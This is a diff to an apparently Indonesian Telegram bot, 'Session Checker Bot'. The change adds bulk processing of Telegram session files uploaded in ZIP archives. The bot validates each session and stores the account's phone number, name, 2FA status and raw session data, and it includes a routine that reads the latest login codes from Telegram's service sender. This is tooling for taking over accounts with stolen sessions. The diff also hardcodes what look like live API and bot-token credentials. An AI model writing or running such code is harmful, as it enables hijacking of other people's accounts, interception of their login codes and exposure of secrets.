@@ -1,7 +1,10 @@
+#
 import os
 import asyncio
 import time
 import json
+import zipfile
+import shutil
 from datetime import datetime
 from telethon.sync import TelegramClient
 from telethon import events, Button
@@ -9,11 +12,11 @@ from telethon.tl.functions.users import GetFullUserRequest
 from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError
 from telethon.tl.functions.messages import GetHistoryRequest
 
-# Bot configuration - GANTI DENGAN INFORMASI ANDA
-API_ID = 25649945  # Ganti dengan API ID Anda
-API_HASH = "d91f3e307f5ee75e57136421f2c3adc6"  # Ganti dengan API Hash Anda
-BOT_TOKEN = "7354445605:AAEyRju_l_T1y-tgHd4NgD-bVJseb3tGr_U"  # Ganti dengan Bot Token Anda
-ADMIN_ID = 5988451717  # Ganti dengan ID Telegram Anda (admin)
+# Bot configuration
+API_ID = 25649945
+API_HASH = "d91f3e307f5ee75e57136421f2c3adc6"
+BOT_TOKEN = "7354445605:AAEyRju_l_T1y-tgHd4NgD-bVJseb3tGr_U"
+ADMIN_ID = 5988451717
 
 # Create the bot
 bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -29,6 +32,9 @@ SESSIONS_FILE = "active_sessions.json"
 
 # OTP Sender
 OTP_SENDER = "+42777"
+
+# Temporary directory for zip extraction
+TEMP_DIR = "temp_zip_extraction"
 
 # Load saved sessions from file
 def load_sessions():
@@ -55,7 +61,7 @@ load_sessions()
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     """Send a message when the command /start is issued."""
-    await event.respond('Selamat datang di Session Checker Bot! Kirim file session Telegram untuk dicheck.')
+    await event.respond('Selamat datang di Session Checker Bot! Kirim file session Telegram atau file ZIP untuk dicheck.')
 
 @bot.on(events.NewMessage(pattern='/kelola'))
 async def kelola(event):
@@ -387,6 +393,139 @@ async def get_latest_otp(session):
     
     return result
 
+# New function to extract and process zip files
+async def process_zip_file(file_path, user_id, message_id):
+    """Extract and process session files from a zip archive."""
+    processing_msg = await bot.send_message(
+        user_id,
+        "⏳ Memproses file ZIP...",
+        reply_to=message_id
+    )
+    
+    # Create temp directory if it doesn't exist
+    if not os.path.exists(TEMP_DIR):
+        os.makedirs(TEMP_DIR)
+    
+    # Generate a unique subfolder for this extraction
+    extract_dir = os.path.join(TEMP_DIR, f"extract_{int(time.time())}")
+    os.makedirs(extract_dir)
+    
+    sessions_found = 0
+    sessions_valid = 0
+    
+    try:
+        # Extract the zip file
+        with zipfile.ZipFile(file_path, 'r') as zip_ref:
+            zip_ref.extractall(extract_dir)
+        
+        # Update processing message
+        await processing_msg.edit("⏳ ZIP diekstrak, mencari file session...")
+        
+        # Look for session files in the expected structure: sessions/users/
+        sessions_dir = os.path.join(extract_dir, "sessions", "users")
+        
+        # Check if the expected directory exists
+        if os.path.exists(sessions_dir) and os.path.isdir(sessions_dir):
+            # Get all files in the sessions/users directory
+            session_files = []
+            for root, _, files in os.walk(sessions_dir):
+                for file in files:
+                    # Skip obvious non-session files
+                    if file.endswith(('.txt', '.md', '.json', '.zip')):
+                        continue
+                    
+                    session_files.append(os.path.join(root, file))
+            
+            total_files = len(session_files)
+            
+            if total_files > 0:
+                await processing_msg.edit(f"⏳ Ditemukan {total_files} file session potensial, memproses...")
+                
+                # Process each session file
+                count = 0
+                for session_file in session_files:
+                    count += 1
+                    if count % 5 == 0:  # Update progress every 5 files
+                        await processing_msg.edit(f"⏳ Memproses file session {count}/{total_files}...")
+                    
+                    sessions_found += 1
+                    result = await check_session_file(session_file)
+                    
+                    if result['valid']:
+                        sessions_valid += 1
+                        
+                        # Format creation date if available
+                        creation_date = "Tidak diketahui"
+                        if 'creation_date' in result and result['creation_date']:
+                            creation_date = result['creation_date'].strftime('%Y-%m-%d %H:%M:%S')
+                        
+                        # Store valid session
+                        user_id_str = str(user_id)
+                        if user_id_str not in active_sessions:
+                            active_sessions[user_id_str] = []
+                        
+                        # Add to active sessions if not already exists
+                        session_exists = False
+                        for existing_session in active_sessions[user_id_str]:
+                            if existing_session.get('user_id') == result.get('user_id'):
+                                session_exists = True
+                                break
+                        
+                        if not session_exists:
+                            # Read session data
+                            session_data = None
+                            try:
+                                with open(result['session_path'], 'rb') as f:
+                                    session_data = f.read().hex()
+                            except:
+                                pass
+                            
+                            # Add to active sessions
+                            active_sessions[user_id_str].append({
+                                'user_id': result.get('user_id'),
+                                'first_name': result.get('first_name', 'Tidak diketahui'),
+                                'last_name': result.get('last_name', 'Tidak ada'),
+                                'username': result.get('username'),
+                                'phone': result.get('phone', 'Tidak diketahui'),
+                                'creation_date': creation_date,
+                                'is_premium': result.get('is_premium', 'Tidak diketahui'),
+                                'has_2fa': result.get('has_2fa', 'Tidak diketahui'),
+                                'session_data': session_data
+                            })
+                
+                # Save sessions
+                save_sessions()
+            else:
+                await processing_msg.edit("❌ Tidak ditemukan file session di dalam struktur sessions/users/ pada file ZIP.")
+        else:
+            await processing_msg.edit("❌ Struktur folder sessions/users/ tidak ditemukan di dalam file ZIP.")
+    except zipfile.BadZipFile:
+        await processing_msg.edit("❌ File tidak valid atau bukan file ZIP.")
+    except Exception as e:
+        await processing_msg.edit(f"❌ Error saat memproses file ZIP: {str(e)}")
+    finally:
+        # Clean up
+        try:
+            if os.path.exists(file_path):
+                os.remove(file_path)
+            
+            if os.path.exists(extract_dir):
+                shutil.rmtree(extract_dir)
+        except:
+            pass
+    
+    # Final report
+    if sessions_found > 0:
+        await processing_msg.edit(
+            f"✅ **PROSES ZIP SELESAI**\n\n"
+            f"📊 **Hasil:**\n"
+            f"- Session ditemukan: {sessions_found}\n"
+            f"- Session valid: {sessions_valid}\n\n"
+            f"Gunakan /kelola untuk melihat dan mengelola session yang valid."
+        )
+    else:
+        await processing_msg.edit("❌ Tidak ada file session yang ditemukan dalam file ZIP.")
+
 @bot.on(events.NewMessage(func=lambda e: e.is_private))
 async def handle_message(event):
     """Handle incoming messages in private chats."""
@@ -399,26 +538,36 @@ async def handle_message(event):
     
     # Check if the message contains a document (file)
     if event.document:
-        # Check if the file might be a session file
+        # Get file name and mime type
         file_name = event.file.name if hasattr(event.file, 'name') else "unknown_file"
+        mime_type = event.file.mime_type if hasattr(event.file, 'mime_type') else ""
         
-        # Download the file
-        download_path = f"temp_{file_name}"
-        await event.download_media(file=download_path)
-        
-        # Save session information
-        current_time = time.time()
-        if user_id not in user_sessions:
-            user_sessions[user_id] = []
-        
-        user_sessions[user_id].append({
-            'path': download_path,
-            'time': current_time,
-            'message_id': event.id
-        })
-        
-        # Schedule a function to check if no more files are sent within 15 seconds
-        asyncio.create_task(check_for_button_prompt(user_id, current_time))
+        # Check if it's a zip file
+        if file_name.lower().endswith('.zip') or mime_type == 'application/zip':
+            # Download the zip file
+            download_path = f"temp_zip_{int(time.time())}.zip"
+            await event.download_media(file=download_path)
+            
+            # Process the zip file
+            await process_zip_file(download_path, user_id, event.id)
+        else:
+            # Download the file (regular session file)
+            download_path = f"temp_{file_name}"
+            await event.download_media(file=download_path)
+            
+            # Save session information
+            current_time = time.time()
+            if user_id not in user_sessions:
+                user_sessions[user_id] = []
+            
+            user_sessions[user_id].append({
+                'path': download_path,
+                'time': current_time,
+                'message_id': event.id
+            })
+            
+            # Schedule a function to check if no more files are sent within 15 seconds
+            asyncio.create_task(check_for_button_prompt(user_id, current_time))
 
 async def check_for_button_prompt(user_id, timestamp):
     """Check if no more files are sent within 15 seconds and prompt with a button."""
